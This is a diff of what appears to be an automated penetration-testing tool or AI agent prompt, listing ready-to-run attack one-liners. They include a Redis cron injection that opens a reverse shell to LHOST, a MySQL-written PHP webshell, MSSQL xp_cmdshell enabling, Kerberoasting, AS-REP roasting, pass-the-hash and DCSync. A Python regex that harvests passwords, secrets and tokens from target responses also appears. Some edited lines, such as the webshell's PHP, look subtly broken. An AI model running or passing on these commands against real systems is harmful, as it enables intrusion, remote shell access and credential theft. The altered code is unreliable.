@@ -9360,12 +9360,12 @@ CRITICAL: Every MSF exploit MUST end with sessions -i for post-exploit (NEVER ju
 
 [Database]
 - Redis no-auth (6379): redis-cli -h TARGET config set dir /var/spool/cron/crontabs && redis-cli -h TARGET config set dbfilename root && redis-cli -h TARGET set pwn "\n\n* * * * * bash -i >&/dev/tcp/LHOST/LPORT 0>&1\n\n" && redis-cli -h TARGET save && sleep 62 && echo REDIS_RCE_DONE
-- MySQL empty root (3306): mysql -h TARGET -u root --password='' -e "SELECT '<?php system(\$_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/cmd.php';" 2>/dev/null && curl -s "http://TARGET/cmd.php?c=id" && echo MYSQL_WEBSHELL
+- MySQL empty root (3306): mysql -h TARGET -u root --password='' -e "SELECT '<?php system(GET[c]);?>' INTO OUTFILE '/var/www/html/cmd.php';" 2>/dev/null && curl -s "http://TARGET/cmd.php?c=id" && echo MYSQL_WEBSHELL
 - MSSQL SA (1433): impacket-mssqlclient TARGET/sa:''@TARGET -windows-auth -q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\root.txt'" 2>/dev/null
 
 [AD / Windows]
 - Kerberoasting: impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.hashes 2>/dev/null && hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -q 2>/dev/null | head -10
-- AS-REP Roasting: impacket-GetNPUsers DOMAIN/ -no-pass -usersfile /tmp/users.txt -dc-ip DC_IP -format hashcat 2>/dev/null | grep '\$krb5asrep' > asrep.hashes && hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force -q 2>/dev/null | head -5
+- AS-REP Roasting: impacket-GetNPUsers DOMAIN/ -no-pass -usersfile /tmp/users.txt -dc-ip DC_IP -format hashcat 2>/dev/null | grep 'krb5asrep' > asrep.hashes && hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force -q 2>/dev/null | head -5
 - Pass-the-Hash: crackmapexec smb TARGET -u Administrator -H NTLM_HASH --exec-method smbexec 2>/dev/null; impacket-secretsdump -hashes ':NTLM_HASH' Administrator@TARGET 2>/dev/null | head -20
 - DCSync (DA): impacket-secretsdump DOMAIN/Administrator:PASS@DC_IP -just-dc-user Administrator 2>/dev/null
 - BloodHound: bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All --zip 2>/dev/null
@@ -19479,7 +19479,7 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                         f"python3 -c 'import sys,json; "
                         f"text=sys.stdin.read(); "
                         f"import re; "
-                        f"creds=re.findall(r'''(?:password|passwd|secret|key|token)[\"'\\s:=]+([^\"'\\s<>{}]{4,40})''', text, re.IGNORECASE); "
+                        f"creds=re.findall(r'(?:password|passwd|secret|key|token)[^\\n]{{0,80}}', text, re.IGNORECASE); "
                         f"[print(\"ACTUATOR_CRED:\", c) for c in creds[:5] if c]' 2>/dev/null; done",
                         target, timeout=20)
                     if "ACTUATOR_CRED" in act_out:
